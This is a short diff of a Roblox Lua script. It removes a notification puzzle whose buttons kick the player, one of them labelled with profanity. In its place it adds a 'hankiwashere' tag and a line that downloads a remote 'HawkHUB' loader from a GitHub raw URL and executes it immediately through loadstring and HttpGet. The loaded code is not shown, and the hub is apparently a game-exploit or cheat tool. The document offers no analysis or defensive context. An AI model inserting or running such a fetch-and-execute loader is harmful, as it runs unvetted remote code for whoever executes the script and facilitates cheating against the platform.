@@ -1,19 +1,9 @@
-local function callback(text)
-    if text == "1" then
-game:GetService("Players").LocalPlayer:Kick("Correct")
-    elseif text == "fuck you" then
-game:GetService("Players").LocalPlayer:Kick("Wrong")
-    end
-end
-
-local bindableFunction= Instance.new("BindableFunction")
+--hankiwashere
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheHanki/HawkHUB/refs/heads/main/HawkHubSources/Scripts/MainSources/HawkLoaderLatest.lua", true))()
 
 game.StarterGui:SetCore("SendNotification", {
     Title = "hankiwashere";
     Text = "Solve this: log10";
     Icon = "";
     Duration = "10";
-    callback = bindableFunction;
-    Button1 = "1";
-    Button2 = "fuck you";
 }
